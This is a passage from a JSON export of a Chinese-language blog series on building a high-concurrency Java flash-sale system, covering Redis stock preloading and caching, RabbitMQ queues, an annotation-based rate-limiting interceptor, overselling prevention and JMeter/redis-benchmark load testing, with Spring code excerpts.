(10)","date":"2020-11-11T04:15:45.000Z","updated":"2021-04-11T17:11:28.237Z","comments":true,"path":"Java-high-performance-and-high-concurrency-spike-system-10/","link":"","permalink":"https://kayleh.top/Java-high-performance-and-high-concurrency-spike-system-10/","excerpt":"","text":"1. 库存预加载到Redis中是怎么实现的？我是通过实现InitializingBean接口，重写其中afterPropertiesSet()方法，实现的预加载 1.1 之后主动添加秒杀商品的话，怎么添加？通过后台管理进行添加，修改redis缓存和数据库中的值 2. 在Redis中扣减库存的时候，是怎么保证线程安全，防止超卖的？redis中有一个decr()方法，它实现的是递减操作，而且能够保证原子性 3. 如果出现Redis缓存雪崩、穿透，怎么解决？雪崩就是缓存中我存储的值全部都失效了，请求直接打到数据库上，请求过大，数据库扛不住。可以用设置这些热点数据永不失效，或者是设置一个随机的过期时间，这样来避免它同时失效。 缓存穿透是缓存和数据库中都没有的数据，如果有人利用这些数据高并发的访问的话，对数据库压力也很大。可以对数据比如它的id值进行一个校验，避免这些不存在的值对数据库进行访问或者是使用布隆过滤器，它的原理是通过高效的数据结构查询数据库中是否存在这个值，不存在的时候，就直接返回，存在的话才会访问到数据库。 4. 限流防刷是怎么实现的？限流防刷我是通过拦截器来实现的，我自定义了一个注解，它实现的功能就是标记在方法上，规定它单位时间内的访问次数，如果超过要求的话，就会被拦截。 拦截器我是继承的HandlerInterceptorAdapter，重写的是preHandle方法，在该方法中，将访问次数同步到Redis中，这个键值对是存在有效期的。最后还要把拦截器配置到项目中，继承WebMvcConfigurerAdapter，重写addInterceptors()方法 5. 对于用户的恶意下单，他知道了你的URL地址，不停的刷，怎么办？我是通过隐藏URL地址来避免这种问题的，当访问秒杀接口的时候，会先从后端生成一个随机的字符串，然后保存到redis中，并且拼接到URL地址上，这样再去访问秒杀的接口，通过RestFul风格的地址，获取其中的随机字符串，与redis中的进行比对，一致的话，才能继续向下访问 6. 秒杀成功后是怎么同步到数据库中的？通过两步，一步是减少商品库存，第二步是创建秒杀订单。 6.1 减库存成功，创建秒杀订单失败了怎么办？这两步过程在一个事务中执行，然后先减少库存，它有一个成功的标志，减少库存成功了，才去执行创建订单的操作 6.2 Spring默认的事务隔离级别默认情况下Spring使用的是数据库设置的默认隔离级别，应该是可重复读 7. RabbitMQ怎么提高消息的高可用？我在创建队列实例的时候，将其创建为可持久化的，它有一个durable属性设置为true，这样，RabbitMQ服务重启的情况下，也不会丢失消息。 8. 说说volatile关键字儿它最重要的一点就是保证了变量的可见性。我想先说说JMM（java内存模型），每个线程有自己的工作内存，另外还存在一个主内存，线程从主内存中获取值存储在自己的工作内存中，当对变量进行修改，它不会立即将其同步到主内中，这个时候若有其他线程来从主内存中获取该变量的时候，就会发生脏读的现象，若被volatile标记的话，就能保证变量的可见性，当变量被修改的时候他就会将其立即同步到主内存中。 9. TCP和UDP的区别 TCP是需要通过三次握手建立连接的；UDP是无连接的 TCP提供的可靠性高；UDP的不保证可靠性，一般用于直播或者是语音通话 TCP是基于字节流的传输层协议，它比较慢；UDP比较快 10. ArrayList 底层是数组，查询快，增删慢 它的默认大小是10，添加值的时候会先对当前数组大小和总大小进行判断，若出现超过最大容量的话，就要进行扩容，扩容的大小是原来大小的1.5倍（右移运算符，右移1位），再将之前的数据复制到新的数组里边。","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"}]},{"title":"Java高性能高并发秒杀系统(9)","slug":"Java高性能高并发秒杀系统 - 副本 (8)","date":"2020-11-09T04:14:45.000Z","updated":"2021-04-15T15:25:35.649Z","comments":true,"path":"Java-high-performance-and-high-concurrency-spike-system-9/","link":"","permalink":"https://kayleh.top/Java-high-performance-and-high-concurrency-spike-system-9/","excerpt":"","text":"1. 动态秒杀地址1.1 前端的改变之前我们实现秒杀的时候是直接跳转到秒杀接口，使得我们每次的秒杀地址都是一样的，这样具有安全隐患，所以，我们将其改为动态地址，通过在前端上写一个方法进行跳转，如下所示。 它会先跳转到/miaosha/path，获取秒杀地址中的path值，将其存储在Redis中 然后携带path值去访问真正的秒杀方法，在其中将path值与Redis中的值进行比较，一致才能继续秒杀 1.2 获取路径的Java代码12345678910111213 @ResponseBody @RequestMapping(value = \"/path\",method = RequestMethod.GET) public Result&lt;String&gt; getMiaoshaPath(MiaoShaUser user,@RequestParam(\"goodsId\")long goodsId, @RequestParam(value = \"verifyCode\",defaultValue = \"0\")int verifyCode)&#123; if(user == null) return Result.error(CodeMsg.SESSION_ERROR); String path = miaoshaService.createMiaoshaPath(user,goodsId); return Result.success(path); &#125;123456789101112 先调用createMiaoshaPath()方法，在其中会创建一串随机值，并且存储到Redis中，具体方法如下，执行完之后将路径值返回到前端 12345678910 public String createMiaoshaPath(MiaoShaUser user, long goodsId) &#123; if(user == null || goodsId &lt;= 0) return null; String str = MD5Util.md5(UUIDUtil.getUUID()); redisService.set(MiaoshaKey.miaoshaPathPrefix,user.getId() + \"_\" + goodsId,str); return str; &#125;123456789 1.3 执行秒杀接口的修改 路径上，我们采用了RestFul风格，通过@PathVariable注解获取其中的路径值，并与redis服务器中的值进行比较，一致才能向下一步继续执行 2. 添加验证码验证我们在立即秒杀按钮处添加验证码，防止机器人对我们的系统进行多次秒杀，也可以使秒杀能够错峰访问，削减并发量，我们采用的是ScriptEngine 2.1 实现过程 首先，我们在路径获取中，添加了对验证码验证的步骤在该方法中，实现的是将从前端获取的验证码与Redis存储的验证码进行验证，验证完成之后，就将它从Redis中移除，方法代码如下 在此之前，前端验证码会和后端有一个响应，每次刷新验证码都会将其的正确结果同步到服务器的Redis上 3. 接口限流防刷 接口限流防刷的作用是在规定的时间内访问固定的次数。我们实现的思路是，在要限制防刷的方法上添加注解，通过拦截器进行限制访问次数 3.1 创建出这个注解该注解中，包含了需要访问时间内的访问次数，以及判断是否需要登录 12345678@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.METHOD)public @interface AccessLimit &#123; int seconds(); int maxCount(); boolean needLogin() default true;&#125;1234567 @Retention(RetentionPolicy.RUNTIME)：注解不仅被保存到class文件中，jvm加载class文件之后，仍然存在； @Target(ElementType.METHOD)：表示注解修饰的是方法 对我们想要限流的方法进行标记 3.2 创建拦截器1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class AccessInterceptor extends HandlerInterceptorAdapter &#123; @Autowired MiaoShaUserService userService; @Autowired RedisService redisService; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; if(handler instanceof HandlerMethod)&#123; MiaoShaUser user = getUser(request,response); UserContext.setUser(user); HandlerMethod hm = (HandlerMethod) handler; //处理方法的对象，获取的是方法的注解 AccessLimit accessLimit = hm.getMethodAnnotation(AccessLimit.class); if(accessLimit == null)&#123; return false; &#125; int seconds = accessLimit.seconds(); int maxCount = accessLimit.maxCount(); boolean needLogin = accessLimit.needLogin(); String key = request.getRequestURI();//获取请求的地址 if (needLogin) &#123; if(user == null)&#123; //user为空，递交错误信息 render(response, CodeMsg.SESSION_ERROR); return false; &#125; key += \"_\" + user.getId(); &#125; AccessKey accessKey = AccessKey.withExpireSecond(seconds); Integer count = redisService.get(accessKey, key, Integer.class); if(count == null)&#123; redisService.set(accessKey,key,1); &#125;else if(count &lt; maxCount)&#123; redisService.incr(accessKey,key); &#125;else&#123; render(response,CodeMsg.ACCESS_LIMIT_REACHED); return false; &#125; &#125; return true; &#125; ......&#125;12345678910111213141516171819202122232425262728293031323334353637383940414243444546 继承HandlerInterceptorAdapter，重写preHandle方法 重要的UserContext我们看一下具体的实现 123456789101112131415public class UserContext &#123; //用ThreadLocal来装user信息，调用它的set和get方法，向其中存储值 //ThreadLocal是为当前线程存储值，所以，在多线程下，各个线程的user并不冲突 private static ThreadLocal&lt;MiaoShaUser&gt; userHolder = new ThreadLocal&lt;&gt;(); public static void setUser(MiaoShaUser user)&#123; userHolder.set(user); &#125; public static MiaoShaUser getUser()&#123; return userHolder.get(); &#125;&#125;1234567891011121314 其中ThreadLocal()源码如下 3.3 后序步骤解释方法后边比较简单啦 3.4 切莫忘记配置，不配置约等于不加拦截器12345678910111213141516171819202122@Configurationpublic class WebConfig extends WebMvcConfigurerAdapter&#123; @Autowired UserArgumentResolver userArgumentResolver; @Autowired AccessInterceptor accessInterceptor; @Override public void addArgumentResolvers(List&lt;HandlerMethodArgumentResolver&gt; argumentResolvers) &#123; super.addArgumentResolvers(argumentResolvers); argumentResolvers.add(userArgumentResolver); &#125; @Override public void addInterceptors(InterceptorRegistry registry) &#123; InterceptorRegistration interceptorRegistration = registry.addInterceptor(accessInterceptor); interceptorRegistration.addPathPatterns(\"/miaosha/path\"); &#125;&#125;123456789101112131415161718192021 在这个配置类中，我们重写的是addInterceptors方法，将拦截器注入进来，加到配置中，(指定要拦截的地址这一步可以省略掉了，因为我们使用的是注解标记，前边有一处写错，开始写的是没有注解的话，返回false，这样全局都被拦截了，应该写成true，这样才能放行），接下来就可以使用了！","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"}]},{"title":"Java高性能高并发秒杀系统(8)","slug":"Java高性能高并发秒杀系统 - 副本 (7)","date":"2020-11-09T04:12:45.000Z","updated":"2021-04-15T15:25:39.718Z","comments":true,"path":"Java-high-performance-and-high-concurrency-spike-system-8/","link":"","permalink":"https://kayleh.top/Java-high-performance-and-high-concurrency-spike-system-8/","excerpt":"","text":"1. 秒杀接口优化思路 重点我们是要减少对数据库的访问 系统初始化时，将秒杀商品库存加载到Redis中 收到请求，在Redis中预减库存，库存不足时，直接返回秒杀失败 秒杀成功，将订单压入消息队列，返回前端消息“排队中”（像12306的买票） 消息出队，生成订单，减少库存 客户端在以上过程执行过程中，将一直轮询是否秒杀成功 2. 清晰框图解析 3. 代码中我们如何实现3.1 库存预加载到Redis中这里我们是通过实现InitialzingBean接口，重写其中afterProperties方法达成的 1234567891011121314151617181920public class MiaoshaController implements InitializingBean &#123; @Override public void afterPropertiesSet() throws Exception &#123; //系统启动的时候，就将数据存入Redis //加载所有秒杀商品 List&lt;GoodsVo&gt; goodsVos = goodsService.listGoodsVo(); if(goodsVos == null) return; //存入Redis中，各秒杀商品的数量 for (GoodsVo good : goodsVos)&#123; redisService.set(GoodsKey.miaoshaGoodsStockPrefix,\"\"+good.getId(),good.getStockCount()); map.put(good.getId(),false); &#125; &#125; ......&#125;12345678910111213141516171819 我们先从数据库中将秒杀商品的信息读取出来，再一个一个加载到缓存中 注意一下其中有一个map，它添加了对应Id-false的键值对，它表示的是该商品没有被秒杀完，用于下文中，当商品秒杀完，阻止其对redis服务的访问（后文还会提到） 3.2 开始秒杀，预减库存1234567891011121314151617 //user不能为空，空了去登陆 if(user == null)&#123; return Result.error(CodeMsg.SESSION_ERROR); &#125; //HashMap内存标记，减少Redis访问时间 boolean over = map.get(goodsId); if(over) return Result.error(CodeMsg.MIAO_SHA_OVER); //收到请求，预减库存 Long count = redisService.decr(GoodsKey.miaoshaGoodsStockPrefix, \"\" + goodsId); if(count &lt;= 0)&#123; map.put(goodsId,true); return Result.error(CodeMsg.MIAO_SHA_OVER); &#125;12345678910111213141516 首先用户不能为空 这里我们又看见了map，它写在了Redis服务前边，当商品秒杀完毕的时候，这样就能防止它再去访问Redis服务了 预减库存，库存小于0的时候就返回秒杀失败 3.3 加入消息队列中（Direct Exchange）1234567891011 //判断是否已经秒杀过了 MiaoshaOrder miaoshaOrder = orderService.selectMiaoshaOrderByUserIdGoodsId(user.getId(), goodsId); if(miaoshaOrder != null) return Result.error(CodeMsg.REPEATE_MIAOSHA); //加入消息队列 MiaoshaMessage miaoshaMessage = new MiaoshaMessage(); miaoshaMessage.setGoodsId(goodsId); miaoshaMessage.setMiaoShaUser(user); mqSender.sendMiaoshaMessage(miaoshaMessage);12345678910 在其之前我们有一个判断，判断该用户是不是重复秒杀，其实这一步是多余的，因为我们在数据库中已经建立了唯一索引，将userId和GoodsId绑定在了一起，不会生成重复的订单 自定义MiaoshaMessage类，创建对象，其中加入我们想要的user和goodsId信息，并将消息发出去 3.4 消息发送过程12345678910 @Autowired AmqpTemplate amqpTemplate; public void sendMiaoshaMessage(MiaoshaMessage miaoshaMessage)&#123; String msg = RedisService.beanToString(miaoshaMessage); log.info(\"miaosha send msg:\" + msg); amqpTemplate.convertAndSend(MQConfig.MIAOSHA_QUEUE,msg); &#125;123456789 用SpringBoot框架提供的AmqpTemlplate实例来为我们的秒杀队列发送消息 3.5 消息出队处理123456789101112131415161718 @RabbitListener(queues = MQConfig.MIAOSHA_QUEUE) public void receiveMiaoshaMsg(String miaoshaMessage)&#123; log.info(\"miaosha receive msg:\" + miaoshaMessage); MiaoshaMessage msg = RedisService.stringToBean(miaoshaMessage, MiaoshaMessage.class); long goodsId = msg.getGoodsId(); MiaoShaUser miaoShaUser = msg.getMiaoShaUser(); GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); //判断库存 int stock = goodsVo.getStockCount(); if(stock &lt; 0) return; //有库存而且没秒杀过，开始秒杀 miaoshaService.miaosha(miaoShaUser,goodsVo); &#125;1234567891011121314151617 判断库存是否还有，有的话，向下执行秒杀 3.5.1 秒杀方法1234567891011121314 @Transactional public OrderInfo miaosha(MiaoShaUser user, GoodsVo goods) &#123; //库存减一 boolean success = goodsService.reduceStock(goods); if(success) //下订单 return orderService.createOrder(user,goods); else&#123; setGoodsOver(goods.getId()); return null; &#125; &#125;12345678910111213 该方法我们用@Transactional注解标记，保证减库存和下订单都执行成功 注意其中有一个setGoodsOver()方法，它的作用是当该商品库存没有的时候，在redis中存一个标志，下面我们接着看 3.6 与前端进行交互的秒杀结果12345678910111213141516171819 /** * orderId 成功 * -1 秒杀失败 * 0 继续轮询 * @param miaoShaUser * @param goodsId * @return */ @RequestMapping(value = \"/result\",method = RequestMethod.GET) @ResponseBody public Result&lt;Long&gt; miaoshaResult(MiaoShaUser miaoShaUser, @RequestParam(\"goodsId\")long goodsId)&#123; if(miaoShaUser == null) return Result.error(CodeMsg.SESSION_ERROR); long result = miaoshaService.getMiaoshaResult(miaoShaUser.getId(),goodsId); return Result.success(result); &#125;123456789101112131415161718 这里写了一个/resulet请求，前端会根据返回值，来判断秒杀的状态 3.6.1 getMiaoshaResult方法12345678910111213141516 public long getMiaoshaResult(long userId, long goodsId) &#123; MiaoshaOrder order = orderService.selectMiaoshaOrderByUserIdGoodsId(userId, goodsId); if(order != null)&#123; //秒杀成功 return order.getOrderId(); &#125;else &#123; boolean isOver = getGoodsOver(goodsId); if(isOver) return -1; else //继续轮询 return 0; &#125; &#125;123456789101112131415 用户在秒杀该商品的过程中，在得到秒杀结果之前，会一直进行轮询，直到返回orderId或者-1来告知秒杀成功与失败 该方法中，从数据库中看看能不能查询到秒杀订单信息，有说明秒杀成功，返回订单号；失败了则获取redis中的是否秒杀完的标志，跟前边setGoodsOver()相对应，这里的getGoodsOver()便是对set的值进行获取，如果没有库存了则说明秒杀失败了，否则要继续轮询了（已经秒杀到，但是订单还没有创建完成）","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"}]},{"title":"Java高性能高并发秒杀系统(7)","slug":"Java高性能高并发秒杀系统 - 副本 (6)","date":"2020-11-08T04:17:45.000Z","updated":"2021-04-15T15:25:43.088Z","comments":true,"path":"Java-high-performance-and-high-concurrency-spike-system-7/","link":"","permalink":"https://kayleh.top/Java-high-performance-and-high-concurrency-spike-system-7/","excerpt":"","text":"1. 集成RabbitMQ1.1 添加依赖 1.2 添加配置信息 2. 进行简单测试（Direct Exchange） 任何发送到Direct Exchange的消息都会被转发到RouteKey中指定的Queue 2.1 创建一个配置类1234567891011@Configurationpublic class MQConfig &#123; public static final String QUEUE_NAME = \"queue\"; @Bean public Queue queue()&#123; return new Queue(QUEUE_NAME,true); &#125;&#125;12345678910 2.1.1 @Bean注解 @Bean注解就是要告诉方法，产生一个Bean对象，并将这个Bean由Spring容器管理。产生这个Bean对象的方法Spring只会调用一次，随后这个Bean将放在IOC容器中。 SpringIOC容器管理一个或者多个Bean，这些Bean都需要在@Configuration注解下进行创建 2.2 创建消息的接受器12345678910@Service@Slf4jpublic class MQReceiver &#123; @RabbitListener(queues = MQConfig.QUEUE_NAME) public void receive(String message)&#123; log.info(\"receive message:\" + message); &#125;&#125;123456789 2.2.1 @RabbitListener注解 @RabbitListener，其中queues属性通过识别队列的名字来接受消息进行消费 2.3 创建消息的发送器123456789101112131415@Service@Slf4jpublic class MQSender &#123; @Autowired //AmqpTemplate接口定义了发送和接收消息的基本操作 AmqpTemplate amqpTemplate; public void send(Object message)&#123; String msg = RedisService.beanToString(message); log.info(\"send message:\" + msg); amqpTemplate.convertAndSend(MQConfig.QUEUE_NAME,msg); &#125;&#125;1234567891011121314 测试通过 ↓ 3. 预先配置 4. Topic Exchange 任何发送到Topic Exchange的消息都会被转发到与routingKey匹配的队列上 4.1 进行配置 4.2 编写消息发送者 4.3 编写消息接收器 4.4 测试结果 我们只绑定了队列1和队列2，根据消息发送者，会为队列1和队列2各发送一条消息，队列1和队列2各收到一条消息 测试内容 测试结果 5. Fanout Exchange 任何发送到Fanout Exchange的消息都会被转发到与之绑定的队列上 5.1 进行配置 5.2 编写消息发送者 5.3 编写消息接受器 5.4 测试结果 根据条件，我们可以知道Fanout Exchange进行广播，每个队列都会收到消息 测试内容 测试结果 6. Headers Exchange 任何发送到Headers Exchange的消息，都会和其中存储的条件进行匹配，有whereall和whereAny的区别（全部匹配/任何匹配） 6.1 进行配置 6.2 编写消息发送者 6.3 编写消息接收器 6.4 测试结果 根据匹配条件我们可以知道，只有3队列能接受到消息。 测试内容 测试结果","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"}]},{"title":"Java高性能高并发秒杀系统(6)","slug":"Java高性能高并发秒杀系统 - 副本 (5)","date":"2020-11-08T04:14:45.000Z","updated":"2021-04-15T15:25:46.351Z","comments":true,"path":"Java-high-performance-and-high-concurrency-spike-system-6/","link":"","permalink":"https://kayleh.top/Java-high-performance-and-high-concurrency-spike-system-6/","excerpt":"","text":"1. 页面缓存优化1.1 未经优化之前的代码12345678 @RequestMapping(\"/to_list\") public String toList(Model model,MiaoShaUser user)&#123; model.addAttribute(\"user\",user); List&lt;GoodsVo&gt; goodsVos = goodsService.listGoodsVo(); model.addAttribute(\"goodsList\",goodsVos); return \"goods_list\"; &#125;1234567 1.2 优化产生的改变 1234567891011121314151617181920@RequestMapping(value = \"/to_list\",produces = \"text/html\")@ResponseBodypublic String toList(HttpServletRequest request, HttpServletResponse response, Model model, MiaoShaUser user)&#123; model.addAttribute(\"user\",user); //在有缓存的情况下，取出缓存 String html = redisService.get(GoodsKey.goodsKeyPrefix, \"\", String.class); if(! StringUtils.isEmpty(html)) return html; //在没有缓存的时候，手动渲染，添加缓存 List&lt;GoodsVo&gt; goodsVos = goodsService.listGoodsVo(); model.addAttribute(\"goodsList\",goodsVos); IWebContext ctx = new WebContext(request,response,request.getServletContext(),request.getLocale(),model.asMap()); html = thymeleafViewResolver.getTemplateEngine().process(\"goods_list\",ctx);//这里需要注入IContext if(!StringUtils.isEmpty(html))&#123; redisService.set(GoodsKey.goodsKeyPrefix,\"\",html); &#125; return html; //return \"goods_list\";&#125; 首先，我们应用缓存，一定要引入RedisService @RequestMapping(value = “/to_list”,produces = &quot;text/html&quot;)produces标注了返回值的类型，必须与@ResponseBody搭配使用 手动渲染过程中，我们要注入ThymeleafViewResolver，这个是框架给我们准备好的Bean，利用它来渲染页面，其中第二个参数，需要注入IContext 在Spring5版本中，SpringWebContext已经没有了，我们需要使用WebContext来代替。它剔除了之前对ApplicationContext 过多的依赖，现在thymeleaf渲染不再过多依赖spring容器 再者，我们对Redis缓存的时间设置了60秒的限制，超过60秒过期，这个时间不宜过长。在60秒内我们看到的网页一直一样是暂且可以接受的 2. 对象缓存与缓存更新2.1 对象缓存对象缓存，我们之前已经做过了一个，就是在MiaoshaService中的getByToken方法，通过token值，从Redis中获取对象信息。这次，我们实现一个getById()方法，即通过Id值，从Redis中获取user对象。（对象缓存没有设置过期时间，而且对象缓存是粒度最小的缓存） 123456789101112 public MiaoShaUser getById(long id)&#123; //先从缓存中取 MiaoShaUser user = redisService.get(MiaoShaUserKey.idPrefix, \"\" + id, MiaoShaUser.class); if(user != null) return user; //缓存中没有，从数据库中取，并且把它添加到缓存中 user = miaoShaUserDao.getById(id); if(user != null) redisService.set(MiaoShaUserKey.idPrefix,\"\" + id,user); return user; &#125;1234567891011 2.2 缓存更新我们模拟一个场景，我们要对密码进行修改，那么缓存也需要修改，现在先列出视频中给的方法，通过Id值取出用户，修改数据库，之后，对token-user缓存进行修改，id-user缓存进行删除 12345678910111213141516 public boolean updatePassword(long id,String formPass,String token)&#123; //取出user MiaoShaUser user = getById(id); //没有这个用户 if(user == null) throw new GlobalException(CodeMsg.MOBILE_NOT_EXIST); //修改密码，更新数据库 user.setPassword(MD5Util.formPassToDBPass(formPass,user.getSalt())); miaoShaUserDao.update(user); //更新缓存,token-user缓存（登陆用的）这个不能删除，id-user缓存删除 redisService.set(MiaoShaUserKey.getTokenPrefix,token,user); redisService.delete(MiaoShaUserKey.idPrefix,id); return true; &#125;123456789101112131415 个人理解：我们上网时的多数场景，修改完密码之后都要我们进行重新登录，而且在我们这个项目中，登录的过程中会对token-user缓存进行重新添加，那么我们在修改密码的时候，可以直接将token-user和id-user全部都删除，而不需要对其中的缓存进行值的修改。 3. 页面静态化3.1 将商品详情页进行静态化处理（订单详情也做了静态化）通常情况下，页面不采用第一种缓存的方式实现优化，而是通过静态化处理，比较常用的技术有Vue。通过静态化处理，我们将页面缓存在客户端浏览器中，不需要与服务器交互就能访问到页面。 以下，我们用JQuery实现。 3.1.1 对后端代码进行处理12345678910111213141516171819202122232425262728293031323334353637 @RequestMapping(value = \"/detail/&#123;goodsId&#125;\") @ResponseBody public Result&lt;GoodsDetailVo&gt; toDetail(HttpServletRequest request, HttpServletResponse response, Model model, MiaoShaUser user, @PathVariable(\"goodsId\") long goodsId)&#123; GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); //秒杀开始、结束时间，当前时间 long startDate = goodsVo.getStartDate().getTime(); long endDate = goodsVo.getEndDate().getTime(); long now = System.currentTimeMillis(); //秒杀状态，0为没开始，1为正在进行，2为秒杀已经结束 int miaoshaStatus = 0; //距离秒杀剩余的时间 int remainSeconds = 0; if(now &lt; startDate)&#123; //秒杀没开始，进行倒计时 remainSeconds = (int) (startDate - now) / 1000; &#125;else if(now &gt; endDate)&#123; //秒杀已经结束 miaoshaStatus = 2; remainSeconds = -1; &#125;else &#123; //秒杀进行时 remainSeconds = 0; miaoshaStatus = 1; &#125; GoodsDetailVo goodsDetailVo = new GoodsDetailVo(); goodsDetailVo.setGoods(goodsVo); goodsDetailVo.setUser(user); goodsDetailVo.setMiaoshaStatus(miaoshaStatus); goodsDetailVo.setRemainSeconds(remainSeconds); return Result.success(goodsDetailVo); &#125;123456789101112131415161718192021222324252627282930313233343536 @RequestMapping中，去掉produces属性 去掉Model向前端传值的逻辑，只留下业务处理过程，并将所需要的的值封装在GoodsDetailVo对象中 注意事项在GoodsDetailVo中的属性字段要与前端所需要的字段名保持一致，如下所示，这样才能获取 123456789@Datapublic class GoodsDetailVo &#123; private long miaoshaStatus; private long remainSeconds; private GoodsVo goods; private MiaoShaUser user;&#125;12345678 对应前端 3.1.2 对前端跳转的修改我们从商品列表页面跳转到商品详情页，修改为如下注意其中/goods_detail.htm，它是放在static目录下的静态资源，为了防止视图解析器的跳转，将html写为htm 3.1.3 在application.properties中配置123456789# staticspring.resources.add-mappings=truespring.resources.cache.period= 3600 #缓存时间spring.resources.chain.cache=true spring.resources.chain.enabled=true#spring.resources.chain.gzipped=truespring.resources.chain.html-application-cache=truespring.resources.static-locations=classpath:/static/12345678 4. POST请求和GET请求的区别 GET：这个请求是幂等的，从服务端获取数据，反复获取不会对数据有影响。因为GET因为是读取，就可以对GET请求的数据做缓存。这个缓存可以做到浏览器本身上（彻底避免浏览器发请求），也可以做到代理上（如nginx），或者做到server端（用Etag，至少可以减少带宽消耗） POST：该请求是不幂等的，它会在页面表单上提交数据，请求服务器的响应，往往会对数据进行修改 5. 解决超卖问题 当多个线程同时读取到同一个库存数量时，防止超卖，修改SQL语句 123#添加stock_count &gt; 0的条件update miaosha_goods set stock_count = stock_count - 1 where goods_id = #&#123;goodsId&#125; and stock_count &gt; 012 防止同一个用户秒杀多个，添加唯一索引，绑定user_id和goods_id，这样同一个用户对同一个商品的秒杀订单是唯一的","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"}]},{"title":"Java高性能高并发秒杀系统(5)","slug":"Java高性能高并发秒杀系统 - 副本 (4)","date":"2020-11-08T04:12:45.000Z","updated":"2021-04-15T15:25:50.462Z","comments":true,"path":"Java-high-performance-and-high-concurrency-spike-system-5/","link":"","permalink":"https://kayleh.top/Java-high-performance-and-high-concurrency-spike-system-5/","excerpt":"","text":"1. JMeter压力测试1.1 测试过程 打开jmeter.bat 设置HTTP默认请求编写协议和端口号 编写测试HTTP请求因为我们已经写过默认设置，我们就可以不用编写协议和地址了，如下，只需编写请求类型和地址即可 添加聚合报告 我们即可在报告中查看压测信息 1.2 Linux top命令 top：相当于Windows下的任务管理器，可以动态显示当前进程的状况 2. 自定义配置文件JMeter压测2.1 测试过程与上方基本一致，不过，要在测试的请求上，添加CSV数据文件设置读取我们自己编写的配置文件，并且标注变量名称，如此，即可开始压测。其中配置文件信息，用英文逗号隔开 3. Redis压测123456789101112#100个并发连接，100000个请求redis-benchmark -h 127.0.0.1 -p 6379 -c 100 -n 100000#存取大小为100字节的数据包redis-benchmark -h 127.0.0.1 -p 6379 -q -d 100#测试set和lpush命令的QPS，其中-q为简化输出redis-benchmark -t set,lpush -q -n 1000000#测试单条命令的QPSredis-benchmark -n 100000 -q script load \"redis.call('set','foo','bar')\"1234567891011 4. Linux环境下，命令行压测 在Windows目录下写好jmx文件 命令行：sh jmeter.sh -n -t xxx.jmx -l result.jtl 再将result.jtl导入到jmeter中 4.1 打成jar包12maven clean package1 打开jar包，我们进入META-INF目录下，打开MANIFEST.MF文件，我们可以发现如下语句其中Main-Class为SpringBoot框架的启动类，在这个类中可以跟进看源码Start-Class为我们自己编写的启动类 4.2 上传到Linux服务器上1234#执行如下命令，之后即可根据如下地址访问#http://182.92.xxx.xxx:8080/loginjava -jar miaosha.jar 123 4.3 编写.jmx文件在Windows上用JMeter编写.jmx脚本，上传到服务器上，执行如下命令行 12jmeter.sh -n -t good_list.jmx -l result.jtl 1 之后，下载result.jtl到Windows本地，进行报告分析 5. SpringBoot 打war包 在pom.xml文件中，添加打包为war包的标签 12&lt;packaging&gt;war&lt;/packaging&gt;1 添加tomcat provided编译时的依赖 123456 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt;12345 在主类中，实现SpringBootServletInitializer，重写configure()方法 12345678910111213@SpringBootApplicationpublic class MiaoshaApplication extends SpringBootServletInitializer &#123; public static void main(String[] args) &#123; SpringApplication.run(MiaoshaApplication.class, args); &#125; @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123; return builder.sources(MiaoshaApplication.class); &#125;&#125;123456789101112 将ROOT目录删除，并且把我们的war包修改为ROOT.war，放在webapps目录下，即可访问","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"}]},{"title":"Java高性能高并发秒杀系统(4)","slug":"Java高性能高并发秒杀系统 - 副本 (3)","date":"2020-11-07T04:13:45.000Z","updated":"2021-04-15T15:25:53.522Z","comments":true,"path":"Java-high-performance-and-high-concurrency-spike-system-4/","link":"","permalink":"https://kayleh.top/Java-high-performance-and-high-concurrency-spike-system-4/","excerpt":"","text":"1. 实现联表查询的一个小技巧商品表和秒杀商品表是两个互相独立的表，其中的关联为goods_id，但是我要返回的对象，既想要商品表中的字段，又想要秒杀商品表中的字段，用下面这个方法，有点儿亮眼 12345678@Datapublic class GoodsVo extends Goods &#123; private Double miaoshaPrice; private Integer stockCount; private Date startDate; private Date endDate;&#125;1234567 创建一个GoodsVo类，继承Goods类，再将秒杀商品表中特有的字段，添加进去即可 1.1 左联表查询SQL语句 查询所有的商品 123 @Select(\"select g.*,mg.stock_count,mg.miaosha_price,mg.start_date,mg.end_date from miaosha_goods mg left join goods g on mg.goods_id = g.id\") public List&lt;GoodsVo&gt; listGoodsVo();12 根据id获取商品 123 @Select(\"select g.*,mg.stock_count,mg.miaosha_price,mg.start_date,mg.end_date from miaosha_goods mg left join goods g on mg.goods_id = g.id where mg.goods_id = #&#123;goodId&#125;\") public GoodsVo getGoodsVoByGoodsId(@Param(\"goodId\")long goodId);12 1.2 Druid数据库连接池中url地址的写法12jdbc:mysql://xxx.xx.xxx.xxx:3306/miaosha?useUnicode=true&amp;characterEncoding=utf-8&amp;allowMultiQueries=true&amp;useSSL=false&amp;useTimezone=true&amp;serverTimezone=GMT%2B81 serverTimezone=GMT%2B8:时区为GMT%2B8 2. 商品详情页对RestFul风格的使用12345 @RequestMapping(\"to_detail/&#123;goodsId&#125;\") public String toDetail(Model model, MiaoShaUser user, @PathVariable(\"goodsId\") long goodsId)&#123; ...&#125;1234 @RequestMapping指定的映射URL，其中有用{}括起来的参数，在方法的形参处，用@PathVariable注解对其进行获取 3. 秒杀功能实现的逻辑 3.1 减少库存的sql语句123 @Update(\"update miaosha_goods set stock_count = stock_count - 1 where goods_id = #&#123;goodsId&#125;\") void reduceStock(MiaoshaGoods miaoshaGoods);12 3.2 创建订单的sql语句12345 @Insert(\"insert into order_info 